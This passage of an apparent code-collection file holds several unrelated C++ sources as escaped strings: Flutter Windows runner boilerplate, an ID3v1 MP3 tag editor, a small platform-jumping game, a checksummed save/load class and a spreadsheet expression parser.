this->dataArr[i + 1];\n    }\n    this->size--;\n    return true;\n  }\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <bits/stdc++.h>\r\n#include <windows.h>\r\nusing namespace std;\r\n\r\nclass Formatas {\r\npublic:\r\n    char tag[3];\r\n    char pavadinimas[30];\r\n    char atlikejas[30];\r\n    char albumas[30];\r\n\r\n    void Read(const char* failo_pavadinimas) {\r\n        HANDLE file = CreateFile(failo_pavadinimas, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n        \r\n        if (file == INVALID_HANDLE_VALUE) {\r\n            cerr << \"Nepavyko atidaryti failo!\";\r\n            return;\r\n        }\r\n\r\n        SetFilePointer(file, -128, NULL, FILE_END);\r\n        DWORD bytesRead;\r\n        ReadFile(file, tag, 3, &bytesRead, NULL);       \r\n        ReadFile(file, pavadinimas, 30, &bytesRead, NULL);     \r\n        ReadFile(file, atlikejas, 30, &bytesRead, NULL);    \r\n        ReadFile(file, albumas, 30, &bytesRead, NULL);     \r\n        CloseHandle(file);\r\n    }\r\n\r\n    void Write(const char* failo_pavadinimas) {\r\n        HANDLE file = CreateFile(failo_pavadinimas, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n        \r\n        SetFilePointer(file, -128, NULL, FILE_END);\r\n        DWORD bytesWritten;\r\n        WriteFile(file, tag, 3, &bytesWritten, NULL);      \r\n        WriteFile(file, pavadinimas, 30, &bytesWritten, NULL); \r\n        WriteFile(file, atlikejas, 30, &bytesWritten, NULL);   \r\n        WriteFile(file, albumas, 30, &bytesWritten, NULL);   \r\n        CloseHandle(file);\r\n    }\r\n};\r\n\r\nint main() {\r\n    const char* failo_pavadinimas = \"bensound-far.mp3\";\r\n    Formatas* IDv3= static_cast<Formatas*>(VirtualAlloc(NULL, sizeof(Formatas), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));\r\n\r\n    IDv3->Read(failo_pavadinimas);\r\n\r\n    cout << \"Pavadinimas: \" << IDv3->pavadinimas << endl;\r\n    cout << \"Atlikejas: \" << IDv3->atlikejas << endl;\r\n    cout << \"Albumas: \" << IDv3->albumas << endl;\r\n   \r\n    cout << \"\\nIveskite nauja pavadinima: \";\r\n    cin.getline(IDv3->pavadinimas, sizeof(IDv3->pavadinimas));\r\n    cout << \"Iveskite nauja atlikeja: \";\r\n    cin.getline(IDv3->atlikejas, sizeof(IDv3->atlikejas));\r\n    cout << \"Iveskite nauja albuma: \";\r\n    cin.getline(IDv3->albumas, sizeof(IDv3->albumas));\r\n\r\n    IDv3->Write(failo_pavadinimas);\r\n    VirtualFree(IDv3, sizeof(Formatas), MEM_RELEASE);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Game Name: Cosmic Climb\r\n// Written by: Caden Leedy\r\n// Date: 12/06/2022\r\n//\r\n// Instructions: Try to climb as high as possible without falling by bouncing off the white platforms. Hover over the screen\r\n// with the mouse and move it left or right to move the ball. \r\n//\r\n\r\n#include \"graphics.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <random>\r\n#include <cmath>\r\n#include <stdio.h>\r\n#include <string>\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int BACKGROUND_COLOR = BLUE;\r\nconst int TEXT_COLOR = WHITE;\r\nconst int ARRAYSIZE = 9;\r\nconst int INITVEL = -26;\r\n\r\nrandom_device myEngine;\r\nuniform_real_distribution<double> randomReal(0.0, 1.0);\r\n\r\n\r\n//enumerated types:\r\n\r\n//defines enumerated type for the different types of platforms\r\nenum PlatformType { STATIC, BROKEN, MOVING };\r\n\r\n//defines enumerated type for different scenarios of the ball landing on a platform\r\nenum Landed { LEFT, MIDDLE, RIGHT };\r\n\r\n//set gravity\r\nconst double GRAVITY = 1.00;\r\n\r\n//constant variables for starting position of ball for each new game\r\nconst double RESETX = 250;\r\nconst double RESETY = 750;\r\n\r\n\r\n//Structure definitions:\r\n\r\n//defines structure for the player which is the ball\r\nstruct Player {\r\n\t// Variables to keep track of position, previous position, and velocity\r\n\tdouble x, y, prevX, prevY, velX, velY, gravity = GRAVITY;\r\n\tint color;\r\n\tbool alive;\r\n\r\n\r\n\r\n\t//a \"constructor\" function\r\n\tPlayer(int c) {\r\n\t\tcolor = c;\r\n\t\talive = true;\r\n\r\n\t\t// Set Initial Position\r\n\t\tx = RESETX;\r\n\t\ty = RESETY;\r\n\r\n\t\t//set previous position to be current position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t// Set Initial Velocity\r\n\t\tvelX = 0;\r\n\t\tvelY = INITVEL;\r\n\t} // end Player() constructor function\r\n\r\n\tvoid move() {\r\n\r\n\t\t//set previous position equal to current position to keep track of old position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t//erase old position\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tfillellipse(prevX, prevY, 20, 20);\r\n\r\n\t\t//move ball and redraw it\r\n\t\tx += velX;\r\n\t\ty += velY;\r\n\r\n\t\t//if ball goes off one side of the screen, makes it re-enter on the other side\r\n\t\tif (x <= -15) {\r\n\t\t\tx = 515;\r\n\t\t}\r\n\t\telse if (x >= 515) {\r\n\t\t\tx = -15;\r\n\t\t}\r\n\r\n\r\n\t\tsetcolor(color);\r\n\t\tsetfillstyle(SOLID_FILL, color);\r\n\t\tfillellipse(x, y, 20, 20);\r\n\r\n\r\n\r\n\t\tvelY += gravity; //change the velocity  by the acceleration due to gravity\r\n\r\n\r\n\t\tvelX = (static_cast<double>((250 - mousex()) * (-1))) / 10;\r\n\r\n\t}\r\n};\r\n\r\n\r\n//defines structure for the platforms\r\nstruct Platform {\r\n\tdouble x, y, prevX, prevY, velX, velY;\r\n\tPlatformType type;\r\n\tbool alive;\r\n\tbool spring;\r\n\r\n\r\n\t//function to calculate distance from player center to top left corner of platform\r\n\t// input the player.x and player.y\r\n\tdouble Ldistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x - 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\t//function to calculate distance from player center to top right corner of platform\r\n\t// input the ball.x and ball.y\r\n\tdouble Rdistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x + 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\r\n\t//function that determines if the ball landed on the plaform, \r\n\t//and returns whether it hit the left rounded edge, somewhere in the middle, or the right rounded edge of the platform\r\n\t//input ball.x, ball.y, and ball.velY\r\n\tLanded landedOn(double ballx, double bally, double prevbally, double vely) {\r\n\t\tif (vely > 0) {\r\n\t\t\tif (((ballx - 15) <= (x + 40)) && ((ballx + 15) >= (x - 40)) && ((bally + 20) >= (y - 5)) && ((prevbally + 20) <= (y - 5))) {\r\n\t\t\t\t//if ((ballx <= (x + 40)) && (ballx >= (x - 40)) && ((bally) >= (y + 5)) && ((y-bally) <=25)) {\r\n\t\t\t\treturn MIDDLE;\r\n\t\t\t}\r\n\t\t\t/*else if ((Ldistance(ballx, bally) <= 25) && ballx < (x - 40)) {\r\n\t\t\t\treturn LEFT;\r\n\t\t\t}\r\n\t\t\telse if ((Rdistance(ballx, bally) <= 25) && ballx > (x + 40)) {\r\n\t\t\t\treturn RIGHT;\r\n\t\t\t}\r\n\t\t\t*/\r\n\t\t}\r\n\t}\r\n\r\n\tvoid move(bool moveY) {\r\n\t\t//erase old\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\r\n\t\tif (type == MOVING) {\r\n\t\t\tif (x >= 450 || x <= 50) {\r\n\t\t\t\tvelX *= -1;\r\n\t\t\t}\r\n\t\t\tx += velX;\r\n\t\t}\r\n\t\tif (moveY)\r\n\t\t\ty -= velY;\r\n\r\n\t\t//draw new\r\n\t\tsetcolor(WHITE);\r\n\t\tsetfillstyle(SOLID_FILL, WHITE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\t}\r\n\r\n\r\n};\r\n//end structure definitions\r\n\r\n\r\n\r\n//Function prototypes\r\nvoid welcomeScreen();\r\nvoid drawHoop(int, int);\r\nvoid initPlatform(Platform&, double, double, int);\r\nvoid bounceball(Landed, Player&, Platform&);\r\nvoid drawPlatform(double, double);\r\nvoid displayScore(int, int, int);\r\nvoid setCosmos(int[], int[]);\r\nvoid drawCosmos(int [], int[]);\r\n\r\nint main()\r\n{\r\n\tbool keepGoing = true;\r\n\tbool movingPlatforms = false;\r\n\tdouble platformVel = 0;\r\n\tchar keyPressed;\r\n\tint score = 0;\r\n\tint xArray[500];\r\n\tint yArray[500];\r\n\r\n\r\n\r\n\tinitwindow(500, 800, (char*)\"Cosmic Climb\", 10, 10);\r\n\r\n  \tsetCosmos(xAr",
    "#include \"DataLoadSave.h\"\r\n\r\n\r\nDataLoadSave::DataLoadSave()\r\n:m_seed(777){}\r\n\r\nint DataLoadSave::SaveData(const std::string& filepath, void* data, uint64_t size)\r\n{\r\n\t//Open file for writing in binary mode\r\n\tstd::ofstream file(filepath, std::ios_base::binary | std::ios_base::out);\r\n\t\r\n\t//Check if failed to open file\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Generate a hash\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(data, size);\r\n\r\n\t//Store the hash\r\n\tuint64_t hash = hasher.hash();\r\n\r\n\t//Starting the actual writing of data\r\n\tfile.write((char*)data, size);\r\n\tfile.write((char*)&hash, sizeof(hash));\r\n\r\n\t//Close the file\r\n\tfile.close();\r\n\r\n\t//Return 0 if successful\r\n\treturn SUCCESS;\r\n}\r\n\r\nint DataLoadSave::LoadData(const std::string& filepath, char* src, uint64_t src_size)\r\n{\r\n\t//Open file for Loading data\r\n\tstd::ifstream file(filepath, std::ios_base::binary);\r\n\r\n\t//Check if file is open\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Start by calculating the file size\r\n\tfile.seekg(0, std::ios::end);\r\n\tuint64_t fsize = file.tellg();\r\n\r\n\t//Reset moved file pointer to start again\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\t//if file is empty return -3\r\n\tif (fsize == 0) \r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_EMPTY;\r\n\t}\r\n\r\n\t//Subtract the last 64 bits or 8 bytes of hash to get data struct size\r\n\tuint64_t datasize = fsize - sizeof(uint64_t);\r\n\r\n\tif (datasize > src_size)\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn SRC_SIZE_NOT_SUFFICIENT;\r\n\t}\r\n\r\n\t//Read the file's data into address of src\r\n\tfile.read(src, src_size);\r\n\r\n\t//Read the file checksum stored at the last of the file\r\n\tuint64_t expectedHash = 0;\r\n\tfile.read((char*)&expectedHash, sizeof(expectedHash));\r\n\r\n\t//Generate hash of the read data\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(&src, datasize);\r\n\r\n\t//if checksum doesnt match then file is probably corrupted\r\n\tif (expectedHash != hasher.hash())\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_CORRUPT;\r\n\t}\r\n\r\n\tfile.close();\r\n\treturn SUCCESS;\r\n}\r\n\r\n",
    "#include \"excel.h\"\n#include <fstream>\n\nnamespace MyExcel {\n\tVector::Vector(int n) : data(new string[n]), capacity(n), length(0) {}\n\tvoid Vector::push_back(string s) {\n\t\tif (capacity <= length) {\n\t\t\tstring* tmp = new string[capacity * 2];\n\t\t\tfor (int i = 0; i < length; i++) {\n\t\t\t\ttmp[i] = data[i];\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t\tdata = tmp;\n\t\t\tcapacity *= 2;\n\t\t}\n\t\tdata[length] = s;\n\t\tlength++;\n\t}\n\tstring Vector::operator[](int i) { return data[i]; }\n\tvoid Vector::remove(int x) {\n\t\tfor (int i = x + 1; i < length; i++) {\n\t\t\tdata[i - 1] = data[i];\n\t\t}\n\t\tlength--;\n\t}\n\tint Vector::size() { return length; }\n\tVector::~Vector() {\n\t\tif (data) {\n\t\t\tdelete[] data;\n\t\t}\n\t}\n\n\tStack::Stack() : start(NULL, \"\") { current = &start; }\n\tvoid Stack::push(string s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tstring Stack::pop() {\n\t\tif (current == &start)\n\t\t\treturn \"\";\n\n\t\tstring s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tstring Stack::peek() { return current->s; }\n\tbool Stack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tStack::~Stack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\tNumStack::NumStack() : start(NULL, 0) { current = &start; }\n\tvoid NumStack::push(double s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tdouble NumStack::pop() {\n\t\tif (current == &start)\n\t\t\treturn 0;\n\n\t\tdouble s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tdouble NumStack::peek() { return current->s; }\n\tbool NumStack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tNumStack::~NumStack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\n\t// Myexcel\n\t// Cell \ud074\ub798\uc2a4(\ucd94\uc0c1_) \n\tCell::Cell(int x, int y, Table* table)\n\t\t: x(x), y(y), table(table) {}\n\n\t// StringCell\n\tStringCell::StringCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring StringCell::stringify() { return data; }\n\tint StringCell::to_numeric() { return 0; }\n\n\t// NumberCell\n\tNumberCell::NumberCell(int data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring NumberCell::stringify() { return to_string(data); }\n\tint NumberCell::to_numeric() { return data; }\n\n\t// *** DateCell\n\tDateCell::DateCell(string s, int x, int y, Table* t) : Cell(x, y, t) {\n\t\t// Date format => yyyy-mm-dd\n\t\t// time_t \uac12\uc73c\ub85c \ubcc0\ud658\ud560 \ub0a0\uc9dc\n\t\tint year = atoi(s.c_str());\n\t\tint month = atoi(s.c_str()+5);\n\t\tint day = atoi(s.c_str()+8);\n\n\t\t// struct tm(tm \uad6c\uc870\uccb4) : \uc0ac\ub78c\uc774 \uc0ac\uc6a9\ud558\ub294 \ub0a0\uc9dc \uac1c\ub150 \uc801\uc6a9\ud55c \uad6c\uc870\uccb4\n\t\ttm timeinfo;\n\n\t\ttimeinfo.tm_year = year - 1900;\n\t\ttimeinfo.tm_mon = month - 1;\n\t\ttimeinfo.tm_mday = day;\n\t\ttimeinfo.tm_hour = 0;\n\t\ttimeinfo.tm_min = 0;\n\t\ttimeinfo.tm_sec = 0;\n\n\t\t// tm -> time_t \uac12\uc73c\ub85c \ubcc0\ud658\n\t\tdata = mktime(&timeinfo); \n\t}\n\n\tstring DateCell::stringify() {\n\t\tchar buf[50];\n\t\ttm temp;\n\t\t// localtime_s : \uc2e4\ud589 \uc2dc\uc810\uc758 \uac12\n\t\t// time_t \ud615\uc2dd\uc744 \ub144\uc6d4\uc77c\uc2dc\ubd84\ucd08 \ud615\ud0dc\ub85c \ubd84\ud560\ud55c \uc77c\uc2dc(struct tm \ud615\uc2dd)\ub85c \ubcc0\ud658\n\t\t// \uba64\ubc84\uac00 \uc788\ub294 tm \uad6c\uc870\uccb4\uc5d0 \ub300\ud55c \ud3ec\uc778\ud130 \ubc18\ud658\n\t\tlocaltime_s(&temp, &data);\n\t\t// string\uc73c\ub85c \ubc18\ud658\n\t\t// %F => ISO \ub0a0\uc9dc \ud615\uc2dd(%Y-%m-%d\uc640 \ub3d9\uc77c).\n\t\tstrftime(buf, 50, \"%F\", &temp);\n\n\t\treturn string(buf);\n\t}\n\n\tint DateCell::to_numeric() {\n\t\t// \ud0c0\uc785 \uce90\uc2a4\ud2b8 \uc5f0\uc0b0\uc790\n\t\treturn static_cast<int>(data);\n\t}\n\n\tExprCell::ExprCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t), parsed_expr(new MyExcel::Vector()) {\n\t\t// \uc0dd\uc131\uc790\uc5d0\uc11c \uc218\uc2dd\uc744 \ud30c\uc2f1\ud558\uc5ec exp_vec \uc5d0 \uc800\uc7a5\n\t\tparse_expression();\n\t}\n\n\tExprCell::~ExprCell() {\n\t\tif (parsed_expr) {\n\t\t\tdelete[] parsed_expr;\n\t\t\tparsed_expr = nullptr;\n\t\t}\n\t}\n\n\tint ExprCell::precedence(char c) {\n\t\tswitch (c) {\n\t\tcase '(':\n\t\tcase '[':\n\t\tcase '{':\n\t\t\treturn 0;\n\t\tcase '+':\n\t\tcase '-':\n\t\t\treturn 1;\n\t\tcase '*':\n\t\tcase '/':\n\t\t\treturn 2;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tvoid ExprCell::parse_expression() {\n\t\tStack 